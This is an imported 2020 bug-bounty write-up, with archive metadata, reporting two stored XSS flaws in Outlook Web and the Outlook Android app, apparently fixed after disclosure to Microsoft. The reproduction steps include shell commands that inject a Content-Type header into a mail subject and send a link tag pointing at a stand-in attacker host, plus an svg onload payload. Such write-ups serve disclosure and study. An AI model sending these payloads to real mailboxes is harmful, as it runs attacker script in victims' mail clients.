---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-28_xss-stored-on-messages-in-outlook-web-outlook-android-app.md
original_filename: 2020-05-28_xss-stored-on-messages-in-outlook-web-outlook-android-app.md
title: XSS Stored On Messages In [ Outlook Web — Outlook Android App ]
category: documents
detected_topics:
- xss
- command-injection
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- mobile-security
language: en
raw_sha256: 7174b4b8bd582ea9013c0253d17da3d15b9f3fdb5957d33979c161a2a39500b9
text_sha256: f5e37469c146eb351bb8bd1ee07985dbfabb64941e155dbce785f9d44ac35faf
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# XSS Stored On Messages In [ Outlook Web — Outlook Android App ]

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-28_xss-stored-on-messages-in-outlook-web-outlook-android-app.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `7174b4b8bd582ea9013c0253d17da3d15b9f3fdb5957d33979c161a2a39500b9`
- Text SHA256: `f5e37469c146eb351bb8bd1ee07985dbfabb64941e155dbce785f9d44ac35faf`


## Content

---
title: "XSS Stored On Messages In [ Outlook Web — Outlook Android App ]"
page_title: "XSS Stored On Messages In [ Outlook Web  - Outlook Android App ]"
url: "https://elmahdi.tistory.com/m/2"
final_url: "https://elmahdi.tistory.com/m/2"
authors: ["ElMahdi Mrhassel (@ElMrhassel)"]
programs: ["Microsoft"]
bugs: ["Stored XSS"]
publication_date: "2020-05-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4552
---

[카테고리 없음](/m/category)

### XSS Stored On Messages In [ Outlook Web - Outlook Android App ]

elmahdi 2020\. 5. 28. 16:08

Hello Everyone this is my first write up and in this writeup i will share with you my findings in Outlook

#### Bug 1 : XSS Stored on outlook.live[.]com

Some services, such as Gmail, Outlook, Yahoo etc, allow sending messages to A e-mail in those services with HTML content [ Content-Type: text/html ], but they filter the message content and only allow some Tags such as
  
  
  <a>  , <h1> , <img> ...

But when I was trying to check if Outlook sanitize the message content as well OR no, I found they're didn't filtering the Tag link
  
  
  <link rel=import href=Bin_File_Attacker>

which allowing to attacker to fetch an external bin file which contain JS content and execute it in the victim’s browser

#### 

#### Steps To Reproduce :

Create a file bin in your website with normal payload XSS , Like this one :
  
  
  echo "<script>alert(1)</script>" | tee /var/www/html/xss.bin

Send an message with text/html as content-type and the link tag with attacker bin file as value of href attribute :
  
  
  echo "<link rel=import href=https://attacker.ma/xss.bin>" | mail -s "$(echo -e "Hey Victim\nContent-Type: text/html")" victim@hotmail.com

#### Proof Of Concept :

#### 

![](https://blog.kakaocdn.net/dna/b6x1ek/btsmRnZ14Nm/AAAAAAAAAAAAAAAAAAAAAFaDf871GxWz9l-Coejrfl-olNtcjxxI2NCACfjU-JR6/img.jpg?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=D82OxxT0OoqwPhMG%2BN3pxlpZEgw%3D) ![](https://blog.kakaocdn.net/dna/ct054U/btsmPGToNwE/AAAAAAAAAAAAAAAAAAAAAL_q09G6t0MF1WJv1Jz_TGUrnb53vFZEQefwMeeSsNSH/img.jpg?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=vkt6CNDVxpDxpmvAd5ztA5lrd1I%3D)

#### Bug 2 : XSS Stored In com.microsoft.office.outlook

After they fixed the first Bug , I downloaded their application on Android [ com.microsoft.office.outlook ] and tried to send to a message containing a Simple XSS Payload the same first way and the sudden thing is that the message is not filtered at all and All html tags is printed without filter

#### Steps To Reproduce :

Send an message with text/html as content-type and the link tag with normal XSS Payload :
  
  
  echo "<svg/onload=alert(1)>" | mail -s "$(echo -e "Hey Victim\nContent-Type: text/html")" victim@hotmail.com

#### Proof Of Concept :

![](https://blog.kakaocdn.net/dna/ceEogS/btsmO8JUn3Q/AAAAAAAAAAAAAAAAAAAAAD1bF2eIdRdWBNr3_aVaadL1-zkQ5cseBuzNXjJkayyl/img.jpg?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=XeTzY1M9hHxm45tEt9Fi1fYSnTg%3D) ![](https://blog.kakaocdn.net/dna/OGs9U/btsmRnyWzru/AAAAAAAAAAAAAAAAAAAAAEPzL2qeHP5US0BDyfoDOyRUKPf1pvPhuEeEHI98qai9/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=uTfSMjhHehBp%2FqfN260I%2BY0QDAc%3D)

#### HOF's Microsoft :

![](https://blog.kakaocdn.net/dna/P43tC/btqYZ7lL5mQ/AAAAAAAAAAAAAAAAAAAAAEX44WBVTB5BUE_4luayeywmZLHibaSm4bMA2Y4z12le/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1782831599&allow_ip=&allow_referer=&signature=28MJvHTVbVMU%2Fq3I1QoKP3i2Gls%3D)
